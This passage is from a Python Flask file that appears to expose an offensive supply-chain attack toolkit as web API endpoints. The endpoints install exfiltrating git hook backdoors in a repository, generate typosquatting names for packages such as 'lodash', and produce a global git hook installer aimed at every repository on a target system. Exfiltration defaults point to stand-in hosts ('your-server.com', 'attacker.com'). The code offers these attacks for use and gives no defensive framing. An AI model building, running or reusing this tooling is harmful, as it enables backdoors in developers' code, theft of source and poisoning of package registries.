            'success': True,
            **result
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@supply_chain_bp.route('/api/git-backdoor', methods=['POST'])
def api_git_backdoor():
    """Setup git repository backdoor"""
    data = request.get_json() or {}
    
    repo_path = data.get('repo_path')
    exfil_url = data.get('exfil_url', 'https://your-server.com')
    hook_type = data.get('hook_type', 'pre-commit')
    magic_string = data.get('magic_string')
    target_extensions = data.get('target_extensions', ['.js', '.ts', '.py'])
    
    if not repo_path:
        return jsonify({'success': False, 'error': 'Repository path required'}), 400
    
    try:
        ht = HookType(hook_type)
        result = _attacker.setup_git_backdoor(
            repo_path=repo_path,
            exfil_url=exfil_url,
            hook_type=ht,
            magic_string=magic_string,
            target_extensions=target_extensions
        )
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@supply_chain_bp.route('/api/typosquat', methods=['POST'])
def api_typosquat():
    """Generate typosquatting candidates"""
    data = request.get_json() or {}
    
    package_name = data.get('package_name')
    count = data.get('count', 20)
    
    if not package_name:
        return jsonify({'success': False, 'error': 'Package name required'}), 400
    
    try:
        candidates = _attacker.generate_typosquat_candidates(package_name, count)
        
        return jsonify({
            'success': True,
            'original': package_name,
            'candidates': candidates,
            'count': len(candidates)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@supply_chain_bp.route('/api/global-hook', methods=['POST'])
def api_global_hook():
    """Generate global git hook installer"""
    data = request.get_json() or {}
    
    exfil_url = data.get('exfil_url', 'https://your-server.com')
    
    try:
        script = _attacker.get_global_hook_installer(exfil_url)
        
        return jsonify({
            'success': True,
            'installer_script': script,
            'warning': 'This will affect ALL git repositories on the target system!'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


if __name__ == '__main__':
    # Demo
    attacker = SupplyChainAttacker()
    
    print("=== Dependency Confusion Scanner Demo ===")
    # result = attacker.scan_dependencies('/path/to/project')
    
    print("\n=== Typosquatting Demo ===")
    typos = attacker.generate_typosquat_candidates('lodash', 10)
    for t in typos:
        print(f"  {t['name']} ({t['technique']})")
    
    print("\n=== Git Hook Backdoor Demo ===")
    # result = attacker.setup_git_backdoor('/path/to/repo', 'https://attacker.com')
